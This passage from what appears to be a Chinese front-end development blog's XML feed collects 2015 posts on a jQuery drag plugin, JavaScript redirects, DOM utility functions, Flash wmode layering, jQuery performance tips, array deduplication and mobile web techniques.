$dragNode.on(&#123; "mousedown": function (event) &#123; var dragElement = draggableConfig.dragElement = new DragElement($ele.get(0)); draggableConfig.mouse.setXY(event.clientX, event.clientY); draggableConfig.dragElement .setXY(dragElement.target.style.left, dragElement.target.style.top) .setTargetCss(&#123; "zIndex": draggableConfig.zIndex++, "position": "relative" &#125;); &#125;, "mouseover": function () &#123; $(this).css(draggableStyle.dragging); &#125;, "mouseout": function () &#123; $(this).css(draggableStyle.defaults); &#125; &#125;) &#125; function move(event) &#123; if (draggableConfig.dragElement) &#123; var mouse = draggableConfig.mouse, dragElement = draggableConfig.dragElement; dragElement.setTargetCss(&#123; "left": parseInt(event.clientX - mouse.x + dragElement.x) + "px", "top": parseInt(event.clientY - mouse.y + dragElement.y) + "px" &#125;); $document.off("mousemove", move); setTimeout(function () &#123; $document.on("mousemove", move); &#125;, 25); &#125; &#125; $document.on(&#123; "mousemove": move, "mouseup": function () &#123; draggableConfig.dragElement = null; &#125; &#125;); $.fn.drag = function (options) &#123; drag(this); &#125;&#125;)(jQuery, window, undefined)&nbsp;点击下载&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JS拖拽插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js跳转到指定页面代码]]></title>
    <url>%2F2015%2F08%2F05%2Fjs%E8%B7%B3%E8%BD%AC%E5%88%B0%E6%8C%87%E5%AE%9A%E9%A1%B5%E9%9D%A2%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[js中跳转页面方法有很多不同种的跳转方法会针对不同的页面或不同的浏览器了，在这里整理的这些都是我们常用的，有需要的可进入参考。第一种：location.href最简单的跳转代码，直跳到指定页面了1window.location.href="login.jsp?backurl="+window.location.href;我们也可以这样写1window.location="login.jsp?backurl="+window.location.href;代码的效果是完全一样的&nbsp;第二种：这种不算跳转了，是返回上一级页面了，如果没有上一级页面是没有任何操作的哦12alert("返回");window.history.back(-1);&nbsp;第三种：window.navigate只能用在IE浏览器了，所以现在几乎都没人使用它了，算是一个垃圾功能了。1window.navigate("www.111cn.net");&nbsp;第四种：这种是在框架页面调用是让自己当前框架页面刷亲了哦1self.location='www.111cn.net';&nbsp;第五种：同样是适用于框架页面我们只是框架中的顶部页面跳转到这个页面12alert("非法访问！");top.location='www.111cn.net';&nbsp;补充：1. Javascript 返回上一页 history.go(-1), 返回两个页面: history.go(-2);2. history.back().3. window.history.forward()返回下一页4. window.history.go(返回第几页,也可以使用访问过的URL)最后来给大家介绍一下 window.navigate 与 window.location.href 的区别吧window.navigate 是只能用在IE浏览器中window.location.href 而这个可以使用到所有浏览器哦。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js跳转页面</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript 常用函数]]></title>
    <url>%2F2015%2F08%2F04%2Fjavascript-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[//获取元素的样式值。123456789101112131415function getStyle(elem, name) &#123; if (elem.style[name]) &#123; return elem.style[name]; &#125; else if (elem.currentStyle) &#123; return elem.currentStyle[name]; &#125; else if (document.defaultView &amp;&amp; document.defaultView.getComputedStyle) &#123; name = name.replace(/([A-Z])/g, ”-$1″); name = name.toLowerCase(); var s = document.defaultView.getComputedStyle(elem,“”); return s &amp;&amp; s.getPropertyValue(name); &#125; else &#123; return null &#125; &#125;&nbsp;//获取元素相对于这个页面的x和y坐标。123456function pageX(elem)&#123; return elem.offsetParent?(elem.offsetLeft+pageX(elem.offsetParent)):elem.offsetLeft; &#125; function pageY(elem)&#123; return elem.offsetParent?(elem.offsetTop+pageY(elem.offsetParent)):elem.offsetTop; &#125;&nbsp;//获取元素相对于父元素的x和y坐标。123456function parentX(elem)&#123; return elem.parentNode==elem.offsetParent?elem.offsetLeft:pageX(elem)-pageX(elem.parentNode); &#125; function parentY(elem)&#123; return elem.parentNode==elem.offsetParent?elem.offsetTop:pageY(elem)-pageY(elem.parentNode); &#125;&nbsp;//获取使用css定位的元素的x和y坐标。123456function posX(elem)&#123; return parseInt(getStyle(elem,”left”)); &#125; function posY(elem)&#123; return parseInt(getStyle(elem,”top”)); &#125;&nbsp;//设置元素位置。123456function setX(elem,pos)&#123; elem.style.left=pos+”px”; &#125; function setY(elem,pos)&#123; elem.style.top=pos+”px”; &#125;&nbsp;//增加元素X和y坐标。123456function addX(elem,pos)&#123; set(elem,(posX(elem)+pos)); &#125; function addY(elem,pos)&#123; set(elem,(posY(elem)+pos)); &#125;//获取元素使用css控制大小的高度和宽度123456function getHeight(elem)&#123; return parseInt(getStyle(elem,”height”)); &#125; function getWidth(elem)&#123; return parseInt(getStyle(elem,”width”)); &#125;&nbsp;//获取元素可能，完整的高度和宽度1234567891011121314151617181920212223242526272829function getFullHeight(elem) &#123; if (getStyle(elem, ”display”) != ”none”) &#123; return getHeight(elem) || elem.offsetHeight; &#125; else &#123; var old = resetCss(elem, &#123; display: ”block”, visibility: ”hidden”, position: ”absolute” &#125;); var h = elem.clientHeight || getHeight(elem); restoreCss(elem, old); return h; &#125;&#125;function getFullWidth(elem) &#123; if (getStyle(elem, ”display”) != ”none”) &#123; return getWidth(elem) || elem.offsetWidth; &#125; else &#123; var old = resetCss(elem, &#123; display: ”block”, visibility: ”hidden”, position: ”absolute” &#125;); var w = elem.clientWidth || getWidth(elem); restoreCss(elem, old); return w; &#125;&#125;&nbsp;//设置css，并保存旧的css1234567891011121314function resetCss(elem, prop) &#123; var old = &#123;&#125;; for (var i in prop) &#123; old[i] = elem.style[i]; elem.style[i] = prop[i]; &#125; return old;&#125;function restoreCss(elem, prop) &#123; for (var i in prop) &#123; elem.style[i] = prop[i]; &#125;&#125;&nbsp;//显示和隐藏12345678910function show(elem)&#123; elem.style.display=elem.$oldDisplay||” “; &#125; function hide(elem)&#123; var curDisplay=getStyle(elem,”display”); if(curDisplay!=”none”)&#123; elem.$oldDisplay=curDisplay; elem.style.display=”none”; &#125; &#125;&nbsp;//设置透明度1234567function setOpacity(elem,num)&#123; if(elem.filters)&#123; elem.style.filter=”alpha(opacity=”+num+”)”; &#125;else&#123; elem.style.opacity=num/100; &#125; &#125;&nbsp;//滑动1234567891011function slideDown(elem)&#123; var h=getFullHeight(elem); elem.style.height=”0px”; show(elem); for(var i=0;i&lt;=100;i+=5)&#123; new function()&#123; var pos=i; setTimeout(function()&#123;elem.style.height=(pos/100*h)+”px”;&#125;,(pos*10)); &#125; &#125; &#125;&nbsp;//渐变123456789101112function fadeIn(elem) &#123; show(elem); setOpacity(elem, 0); for (var i = 0; i &lt;= 100; i += 5) &#123; new function() &#123; var pos = i; setTimeout(function() &#123; setOpacity(elem, pos); &#125;, (pos + 1) * 10); &#125; &#125;&#125;//获取鼠标光标相对于整个页面的位置。12345678function getX(e)&#123; e=e||window.event; return e.pageX||e.clientX+document.body.scrollLeft; &#125; function getY(e)&#123; e=e||window.event; return e.pageY||e.clientY+document.body.scrollTop; &#125;&nbsp;//获取鼠标光标相对于当前元素的位置。123456function getElementX(e)&#123; return (e&amp;&amp;e.layerX)||window.event.offsetX; &#125; function getElementY(e)&#123; return (e&amp;&amp;e.layerY)||window.event.offsetY; &#125;&nbsp;//获取页面的高度和宽度12345678function getPageHeight()&#123; var de=document.documentElement; return document.body.scrollHeight||(de&amp;&amp;de.scrollHeight); &#125; function getPageWidth()&#123; var de=document.documentElement; return document.body.scrollWidth||(de&amp;&amp;de.scrollWidth); &#125;//获取滚动条的位置。12345678function scrollX()&#123; var de=document.documentElement; return self.pageXOffset||(de&amp;&amp;de.scrollLeft)||document.body.scrollLeft; &#125; function scrollY()&#123; var de=document.documentElement; return self.pageYOffset||(de&amp;&amp;de.scrollTop)||document.body.scrollTop; &#125;//获取视口的高度和宽度。12345678function windowHeight() &#123; var de = document.documentElement; return self.innerHeight||(de &amp;&amp; de.offsetHeight)||document.body.offsetHeight; &#125; function windowWidth() &#123; var de = document.documentElement; return self.innerWidth||( de &amp;&amp; de.offsetWidth )||document.body.offsetWidth; &#125;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js常用函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决div层被flash遮盖的问题]]></title>
    <url>%2F2015%2F08%2F04%2F%E8%A7%A3%E5%86%B3div%E5%B1%82%E8%A2%ABflash%E9%81%AE%E7%9B%96%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;页面构建中的Flash层会遮挡Div的问题，一般通过设置wmode=”transparent” 或wmode=”window”就可以解决。不过对于Flash视频这个貌似不太凑效。对于Flash遮挡的问题，首先来了解一些wmode的一些属性值。wmode的5种取值Window模式&emsp;&emsp;默认情况下的显示模式，在这种模式下 flash player 有自己的窗口句柄，这就意味着 flash 影片是存在于 Windows 中的一个显示实例，并且是在浏览器核心显示窗口之上的，所以 flash 只是貌似显示在浏览器中，但这也是 flash 最快最有效率的渲染模式。由于他是独立于浏览器的HTML渲染表面，这就导致默认显示方式下flash总是会遮住位置与他重合的所有 HTML 层。Opaque模式&emsp;&emsp;这是一种无窗口模式，在这种情况下flash player没有自己的窗口句柄，这就需要浏览器需要告诉flash player在浏览器的渲染表面绘制的时间和位置。这时flash影片就不会在高于浏览器HTML渲染表面而是与其他元素一样在同一个页面上，因此你就可以使用 z-index 值来控制 HTML 元素是遮盖 flash 或者被遮盖。Transparent模式&emsp;&emsp;透明模式，在这种模式下 flash player 会将 stage 的背景色 alpha 值降为 0 并且只会绘制 stage 上真实可见的对象，同样你也可以使用 z-index 来控制 flash 影片的层级值，但是与 Opaque 模式不同的是这样做会降低 flash 影片的回放效果，而且在 9.0.115 之前的 flash player 版本设置 wmode=”opaque” 或 “transparent” 会导致全屏模式失效。Direct模式&emsp;&emsp;直接渲染模式，在该模式下，flash player 可以通过硬件直接对画面进行合成，并呈现在屏幕上。使用这种模式能够得到比 window 模式更好的渲染效果，特别是在视频播放方面，如果页面的 flash 需要使用了 stagevideo 或者 stage3D，那么必须使用这种模式。它有比 window 模式更好的渲染，但也有 window 模式下的所有缺点。GPU模式&emsp;&emsp;在一些网络电视和移动设备上可以启用额外的硬件加速，与其他 wmode 值模式相比，显示序列的像素保真度无法保证，其他方面跟 direct 模式相似。&nbsp;div遮盖Flash层测试结论1.使用 opaque/transparent 模式，只需 div 就可以遮挡住 Flash，对于Flash视频，IE中的div层需要嵌套iframe标签才可以遮挡；2.使用 window/direct/gpu 模式：IE 需要借助 iframe 才能遮挡 FlashChrome 仅 div 即可遮挡 FlashFirefox 当使用 rgba 的半透明背景色浮层时，无法遮挡 Flash，只有具有背景色(background-color:#fff)的元素才能遮挡 Flash，透明背景(background:transparent)，或者背景颜色为半透明(background-color:rgba(255,255,255,0.5))，或者使用半透明图片(background:url(alpha.png))做背景的元素都无法遮挡 FlashWindows Safari 即使 iframe 也无法遮挡 FlashMac 系统下 wmode 取任何值， div 元素都能轻松遮挡 Flash 元素&nbsp;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>div被flash遮盖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何提高jQuery的使用性能之Jq性能优化]]></title>
    <url>%2F2015%2F08%2F03%2F%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98jquery%E7%9A%84%E4%BD%BF%E7%94%A8%E6%80%A7%E8%83%BD%E4%B9%8Bjq%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[1、缓存变量DOM遍历是昂贵的，所以尽量将会重用的元素缓存。1234567// 糟糕h = $('#element').height();$('#element').css('height',h-20);// 建议$element = $('#element');h = $element.height();$element.css('height',h-20);2、避免全局变量jQuery与javascript一样，一般来说,最好确保你的变量在函数作用域内。12345678// 糟糕$element = $('#element');h = $element.height();$element.css('height',h-20);// 建议var $element = $('#element');var h = $element.height();$element.css('height',h-20);3、使用匈牙利命名法在变量前加$前缀，便于识别出jQuery对象。12345678// 糟糕var first = $('#first');var second = $('#second');var value = $first.val();// 建议 - 在jQuery对象前加$前缀var $first = $('#first');var $second = $('#second'),var value = $first.val();4、使用 Var 链（单 Var 模式）将多条var语句合并为一条语句，我建议将未赋值的变量放到后面。123456789var $first = $('#first'), $second = $('#second'), value = $first.val(), k = 3, cookiestring = 'SOMECOOKIESPLEASE', i, j, myArray = &#123;&#125;;5、请使用’On’&emsp;&emsp;在新版jQuery中，更短的 on(“click”) 用来取代类似 click() 这样的函数。在之前的版本中 on() 就是 bind()。自从jQuery 1.7版本后，on() 附加事件处理程序的首选方法。然而，出于一致性考虑，你可以简单的全部使用 on()方法。12345678910111213141516// 糟糕$first.click(function()&#123; $first.css('border','1px solid red'); $first.css('color','blue');&#125;);$first.hover(function()&#123; $first.css('border','1px solid red');&#125;)// 建议$first.on('click',function()&#123; $first.css('border','1px solid red'); $first.css('color','blue');&#125;)$first.on('hover',function()&#123; $first.css('border','1px solid red');&#125;)6、精简javascript一般来说,最好尽可能合并函数。123456789101112// 糟糕$first.click(function()&#123; $first.css('border','1px solid red'); $first.css('color','blue');&#125;);// 建议$first.on('click',function()&#123; $first.css(&#123; 'border':'1px solid red', 'color':'blue' &#125;);&#125;);7、链式操作jQuery实现方法的链式操作是非常容易的。下面利用这一点。123456789101112// 糟糕$second.html(value);$second.on('click',function()&#123; alert('hello everybody');&#125;);$second.fadeIn('slow');$second.animate(&#123;height:'120px'&#125;,500);// 建议$second.html(value);$second.on('click',function()&#123; alert('hello everybody');&#125;).fadeIn('slow').animate(&#123;height:'120px'&#125;,500);8、维持代码的可读性伴随着精简代码和使用链式的同时，可能带来代码的难以阅读。添加缩紧和换行能起到很好的效果。1234567891011// 糟糕$second.html(value);$second.on('click',function()&#123; alert('hello everybody');&#125;).fadeIn('slow').animate(&#123;height:'120px'&#125;,500);// 建议$second.html(value);$second .on('click',function()&#123; alert('hello everybody');&#125;) .fadeIn('slow') .animate(&#123;height:'120px'&#125;,500);9、选择短路求值短路求值是一个从左到右求值的表达式，用 &amp;&amp;（逻辑与）或 || （逻辑或）操作符。12345678910// 糟糕function initVar($myVar) &#123; if(!$myVar) &#123; $myVar = $('#selector'); &#125;&#125;// 建议function initVar($myVar) &#123; $myVar = $myVar || $('#selector');&#125;10、选择捷径精简代码的其中一种方式是利用编码捷径。1234// 糟糕if(collection.length &gt; 0)&#123;..&#125;// 建议if(collection.length)&#123;..&#125;11、繁重的操作中分离元素如果你打算对DOM元素做大量操作（连续设置多个属性或css样式），建议首先分离元素然后在添加。123456789101112131415// 糟糕var $container = $("#container"), $containerLi = $("#container li"), $element = null;$element = $containerLi.first(); //... 许多复杂的操作// bettervar $container = $("#container"), $containerLi = $container.find("li"), $element = null;$element = $containerLi.first().detach(); //... 许多复杂的操作$container.append($element);12、熟记技巧你可能对使用jQuery中的方法缺少经验,一定要查看的文档，可能会有一个更好或更快的方法来使用它。1234// 糟糕$('#id').data(key,value);// 建议 (高效)$.data('#id',key,value);13、使用子查询缓存的父元素正如前面所提到的，DOM遍历是一项昂贵的操作。典型做法是缓存父元素并在选择子元素时重用这些缓存元素。12345678910// 糟糕var $container = $('#container'), $containerLi = $('#container li'), $containerLiSpan = $('#container li span');// 建议 (高效)var $container = $('#container '), $containerLi = $container.find('li'), $containerLiSpan= $containerLi.find('span');14、避免通用选择符将通用选择符放到后代选择符中，性能非常糟糕。1234// 糟糕$('.container &gt; *'); // 建议$('.container').children();15、避免隐式通用选择符通用选择符有时是隐式的，不容易发现。1234// 糟糕$('.someclass :radio'); // 建议$('.someclass input:radio');16、优化选择符例如，Id选择符应该是唯一的，所以没有必要添加额外的选择符。123456// 糟糕$('div#myid'); $('div#footer a.myLink');// 建议$('#myid');$('#footer .myLink');避免多个ID选择符在此强调，ID 选择符应该是唯一的，不需要添加额外的选择符，更不需要多个后代ID选择符。1234// 糟糕$('#outer #inner'); // 建议$('#inner');17、坚持最新版本新版本通常更好：更轻量级，更高效。显然，你需要考虑你要支持的代码的兼容性。例如，2.0版本不支持ie 6/7/8。摒弃弃用方法关注每个新版本的废弃方法是非常重要的并尽量避免使用这些方法。1234// 糟糕$('#outer #inner'); // 建议$('#inner');利用CDN谷歌的CND能保证选择离用户最近的缓存并迅速响应。（使用谷歌CND请自行搜索地址，此处地址以不能使用，推荐jquery官网提供的CDN）。18、必要时组合jQuery和javascript原生代码&emsp;&emsp;如上所述，jQuery就是javascript，这意味着用jQuery能做的事情，同样可以用原生代码来做。原生代码（或vanilla）的可读性和可维护性可能不如jQuery，而且代码更长。但也意味着更高效（通常更接近底层代码可读性越差，性能越高，例如：汇编，当然需要更强大的人才可以）。牢记没有任何框架能比原生代码更小，更轻，更高效（注：测试链接已失效，可上网搜索测试代码）。鉴于vanilla 和 jQuery之间的性能差异，我强烈建议吸收两人的精华，使用（可能的话）和jQuery等价的原生代码。最后忠告&emsp;&emsp;最后，我记录这篇文章的目的是提高jQuery的性能和其他一些好的建议。如果你想深入的研究对这个话题你会发现很多乐趣。记住，jQuery并非不可或缺，仅是一种选择。思考为什么要使用它。DOM操作？ajax？模版？css动画？还是选择符引擎？或许javascript微型框架或jQuery的定制版是更好的选择。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>jq性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数组去重方法小结]]></title>
    <url>%2F2015%2F08%2F03%2F%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E6%96%B9%E6%B3%95%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637Array.prototype.unique1 = function() &#123; var arr = []; for(var i=0;i&lt;this.length;i++) &#123; //判断有没有数组在里面，没有就放进去 if(arr.indexOf(this[i]) == -1 )&#123; arr.push(this[i]) &#125; &#125; return arr;&#125;Array.prototype.unique2 = function() &#123; var arr = [], json = &#123;&#125;; for(var i = 0;i&lt;this.length;i++) &#123; //使用哈希表，利用关键字的判断去重 //如果哈希表中没有当前项 if(!json[this[i]]) &#123; json[this[i]] = true; arr.push(this[i]); &#125; &#125; return arr;&#125;Array.prototype.unique3 = function() &#123; this.sort(req); //先进行数组的排序 var arr = []; for(var i=0;i&lt;this.length;i++) &#123; //如果当前项与上一项不相同时，则存入结果数组 if(this[i] != this[i-1]) &#123; arr.push(this[i]); &#125; &#125; return arr;&#125;==PS:推荐用第二第三种方法==]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>数组去重</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对移动前端开发的知识总结]]></title>
    <url>%2F2015%2F08%2F03%2F%E5%AF%B9%E7%A7%BB%E5%8A%A8%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9A%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[meta基础知识H5页面窗口自动调整到设备宽度，并禁止用户缩放页面1&lt;meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" /&gt;忽略将页面中的数字识别为电话号码1&lt;meta name="format-detection" content="telephone=no" /&gt;忽略Android平台中对邮箱地址的识别1&lt;meta name="format-detection" content="email=no" /&gt;当网站添加到主屏幕快速启动方式，可隐藏地址栏，仅针对ios的safari12&lt;meta name="apple-mobile-web-app-capable" content="yes" /&gt;&lt;!-- ios7.0版本以后，safari上已看不到效果 --&gt;将网站添加到主屏幕快速启动方式，仅针对ios的safari顶端状态条的样式12&lt;meta name="apple-mobile-web-app-status-bar-style" content="black" /&gt;&lt;!-- 可选default、black、black-translucent --&gt;viewport模板123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;title&gt;标题&lt;/title&gt;&lt;link rel="stylesheet" href="index.css"&gt;&lt;/head&gt;&lt;body&gt;这里开始内容&lt;/body&gt;&lt;/html&gt;常见问题移动端如何定义字体font-family，中文字体使用系统默认即可，英文用Helvetica12/* 移动端定义字体的代码 */body&#123;font-family:Helvetica;&#125;&emsp;&emsp;移动端字体单位font-size选择px还是rem，对于只需要适配手机设备，使用px即可，对于需要适配各种移动设备，使用rem，例如只需要适配iPhone和iPad等分辨率差别比较挺大的设备rem配置参考：12345678910111213141516171819202122232425262728293031323334353637383940414243html &#123;font-size:10px&#125;@media screen and (min-width:480px) and (max-width:639px) &#123;html &#123;font-size: 15px&#125;&#125;@media screen and (min-width:640px) and (max-width:719px) &#123;html &#123;font-size: 20px&#125;&#125;@media screen and (min-width:720px) and (max-width:749px) &#123;html &#123;font-size: 22.5px&#125;&#125;@media screen and (min-width:750px) and (max-width:799px) &#123;html &#123;font-size: 23.5px&#125;&#125;@media screen and (min-width:800px) and (max-width:959px) &#123;html &#123;font-size: 25px&#125;&#125;@media screen and (min-width:960px) and (max-width:1079px) &#123;html &#123;font-size: 30px&#125;&#125;@media screen and (min-width:1080px) &#123;html &#123;font-size: 32px&#125;&#125;移动端touch事件(区分webkit 和 winphone)当用户手指放在移动设备在屏幕上滑动会触发的touch事件以下支持webkittouchstart——当手指触碰屏幕时候发生。不管当前有多少只手指touchmove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用event的preventDefault()可以阻止默认情况的发生：阻止页面滚动touchend——当手指离开屏幕时触发touchcancel——系统停止跟踪触摸时候会触发。例如在触摸过程中突然页面alert()一个提示框，此时会触发该事件，这个事件比较少用以下支持winphone 8MSPointerDown——当手指触碰屏幕时候发生。不管当前有多少只手指MSPointerMove——当手指在屏幕上滑动时连续触发。通常我们再滑屏页面，会调用css的html{-ms-touch-action: none;}可以阻止默认情况的发生：阻止页面滚动MSPointerUp——当手指离开屏幕时触发移动端click屏幕产生200-300 ms的延迟响应&emsp;&emsp;移动设备上的web网页是有300ms延迟的，玩玩会造成按钮点击延迟甚至是点击失效。==以下是历史原因，来源其他人的分享：==&emsp;&emsp;2007年苹果发布首款iphone上IOS系统搭载的safari为了将适用于PC端上大屏幕的网页能比较好的展示在手机端上，使用了双击缩放(double tap to zoom)的方案，比如你在手机上用浏览器打开一个PC上的网页，你可能在看到页面内容虽然可以撑满整个屏幕，但是字体、图片都很小看不清，此时可以快速双击屏幕上的某一部分，你就能看清该部分放大后的内容，再次双击后能回到原始状态。&emsp;&emsp;双击缩放是指用手指在屏幕上快速点击两次，iOS 自带的 Safari 浏览器会将网页缩放至原始比例。&emsp;&emsp;原因就出在浏览器需要如何判断快速点击上，当用户在屏幕上单击某一个元素时候，例如跳转链接，此处浏览器会先捕获该次单击，但浏览器不能决定用户是单纯要点击链接还是要双击该部分区域进行缩放操作，所以，捕获第一次单击后，浏览器会先Hold一段时间t，如果在t时间区间里用户未进行下一次点击，则浏览器会做单击跳转链接的处理，如果t时间里用户进行了第二次单击操作，则浏览器会禁止跳转，转而进行对该部分区域页面的缩放操作。那么这个时间区间t有多少呢？在IOS safari下，大概为300毫秒。这就是延迟的由来。造成的后果用户纯粹单击页面，页面需要过一段时间才响应，给用户慢体验感觉，对于web开发者来说是，页面js捕获click事件的回调函数处理，需要300ms后才生效，也就间接导致影响其他业务逻辑的处理。解决方案：fastclick可以解决在手机上点击事件的300ms延迟zepto的touch模块，tap事件也是为了解决在click的延迟问题触摸事件的响应顺序1、ontouchstart2、ontouchmove3、ontouchend4、onclick解决300ms延迟的问题，也可以通过绑定ontouchstart事件，加快对事件的响应什么是Retina 显示屏，带来了什么问题retina：一种具备超高像素密度的液晶屏，同样大小的屏幕上显示的像素点由1个变为多个，如在同样带下的屏幕上，苹果设备的retina显示屏中，像素点1个变为4个在高清显示屏中的位图被放大，图片会变得模糊，因此移动端的视觉稿通常会设计为传统PC的2倍那么，前端的应对方案是：设计稿切出来的图片长宽保证为偶数，并使用backgroud-size把图片缩小为原来的1/2//例如图片宽高为：200px*200px，那么写法如下1.css&#123;width:100px;height:100px;background-size:100px 100px;&#125;其它元素的取值为原来的1/2，例如视觉稿40px的字体，使用样式的写法为20px1.css&#123;font-size:20px&#125;&emsp;&emsp;ios系统中元素被触摸时产生的半透明灰色遮罩怎么去掉ios用户点击一个链接，会出现一个半透明灰色遮罩, 如果想要禁用，可设置-webkit-tap-highlight-color的alpha值为0，也就是属性值的最后一位设置为0就可以去除半透明灰色遮罩1a,button,input,textarea&#123;-webkit-tap-highlight-color: rgba(0,0,0,0;)&#125;&emsp;&emsp;部分android系统中元素被点击时产生的边框怎么去掉android用户点击一个链接，会出现一个边框或者半透明灰色遮罩, 不同生产商定义出来额效果不一样，可设置-webkit-tap-highlight-color的alpha值为0去除部分机器自带的效果1234a,button,input,textarea&#123;-webkit-tap-highlight-color: rgba(0,0,0,0;)-webkit-user-modify:read-write-plaintext-only;&#125;-webkit-user-modify有个副作用，就是输入法不再能够输入多个字符另外，有些机型去除不了，如小米2对于按钮类还有个办法，不使用a或者input标签，直接用div标签winphone系统a、input标签被点击时产生的半透明灰色背景怎么去掉1&lt;meta name="msapplication-tap-highlight" content="no"&gt;webkit表单元素的默认外观怎么重置1.css&#123;-webkit-appearance:none;&#125;webkit表单输入框placeholder的颜色值能改变么12input::-webkit-input-placeholder&#123;color:#AAAAAA;&#125;input:focus::-webkit-input-placeholder&#123;color:#EEEEEE;&#125;webkit表单输入框placeholder的文字能换行么ios可以，android不行~IE10（winphone8）表单元素默认外观如何重置禁用 select 默认下拉箭头::-ms-expand 适用于表单选择控件下拉箭头的修改，有多个属性值，设置它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。123select::-ms-expand &#123;display: none;&#125;禁用 radio 和 checkbox 默认样式::-ms-check 适用于表单复选框或单选按钮默认图标的修改，同样有多个属性值，设置它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。123input[type=radio]::-ms-check,input[type=checkbox]::-ms-check&#123;display: none;&#125;禁用PC端表单输入框默认清除按钮&emsp;&emsp;当表单文本输入框输入内容后会显示文本清除按钮，::-ms-clear 适用于该清除按钮的修改，同样设置使它隐藏 (display:none) 并使用背景图片来修饰可得到我们想要的效果。123input[type=text]::-ms-clear,input[type=tel]::-ms-clear,input[type=number]::-ms-clear&#123;display: none;&#125;禁止ios 长按时不触发系统的菜单，禁止ios&amp;android长按时下载图片1.css&#123;-webkit-touch-callout: none&#125;禁止ios和android用户选中文字1.css&#123;-webkit-user-select:none&#125;打电话发短信的怎么实现打电话1&lt;a href="tel:0755-10086"&gt;打电话给:0755-10086&lt;/a&gt;发短信，winphone系统无效1&lt;a href="sms:10086"&gt;发短信给: 10086&lt;/a&gt;模拟按钮hover效果&emsp;&emsp;移动端触摸按钮的效果，可明示用户有些事情正要发生，是一个比较好体验，但是移动设备中并没有鼠标指针，使用css的hover并不能满足我们的需求，还好国外有个激活css的active效果，代码如下，123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;style type="text/css"&gt;a&#123;-webkit-tap-highlight-color: rgba(0,0,0,0);&#125;.btn-blue&#123;display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color: #4185F3;&#125;.btn-blue:active&#123;background-color: #357AE8;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btn-blue"&gt;按钮&lt;/div&gt;&lt;script type="text/javascript"&gt;document.addEventListener("touchstart", function()&#123;&#125;, true)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;兼容性ios5+、部分android 4+、winphone 8&emsp;&emsp;要做到全兼容的办法，可通过绑定ontouchstart和ontouchend来控制按钮的类名123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" name="viewport"&gt;&lt;meta content="yes" name="apple-mobile-web-app-capable"&gt;&lt;meta content="black" name="apple-mobile-web-app-status-bar-style"&gt;&lt;meta content="telephone=no" name="format-detection"&gt;&lt;meta content="email=no" name="format-detection"&gt;&lt;style type="text/css"&gt;a&#123;-webkit-tap-highlight-color: rgba(0,0,0,0);&#125;.btn-blue&#123;display:block;height:42px;line-height:42px;text-align:center;border-radius:4px;font-size:18px;color:#FFFFFF;background-color: #4185F3;&#125;.btn-blue-on&#123;background-color: #357AE8;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="btn-blue"&gt;按钮&lt;/div&gt;&lt;script type="text/javascript"&gt;var btnBlue = document.querySelector(".btn-blue");btnBlue.ontouchstart = function()&#123;this.className = "btn-blue btn-blue-on"&#125;btnBlue.ontouchend = function()&#123;this.className = "btn-blue"&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;屏幕旋转的事件和样式事件window.orientation，取值：正负90表示横屏模式、0和180表现为竖屏模式；1234567891011window.onorientationchange = function()&#123;switch(window.orientation)&#123;case -90:case 